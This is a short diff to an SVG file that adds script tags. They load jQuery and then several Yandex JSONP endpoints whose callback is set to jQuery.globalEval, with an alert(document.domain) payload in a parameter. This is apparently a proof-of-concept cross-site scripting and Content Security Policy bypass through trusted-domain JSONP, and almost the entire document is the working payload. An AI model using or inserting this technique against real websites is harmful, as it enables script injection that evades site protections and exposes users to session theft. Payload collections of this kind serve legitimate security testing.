@@ -3,4 +3,9 @@
    <script type="text/javascript">  
       alert(0x539);
    </script>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+   <script src="https://xml.yandex.ru/gate/regions/?callback=jQuery.globalEval&part=alert(document.domain)//"></script>
+   <script src="https://yandex.ru/suggest-ya.cgi?callback=jQuery.globalEval&v=4&part=alert(document.domain)//"></script>
+   <script src="https://yandex.ru/suggest-images/suggest-ya.cgi?callback=jQuery.globalEval&v=4&part=alert(document.domain)//"></script>
+   <script src="https://yandex.ru/suggest-collections/suggest-collections?callback=jQuery.globalEval&v=4&part=alert(document.domain)//"></script>
 </svg>
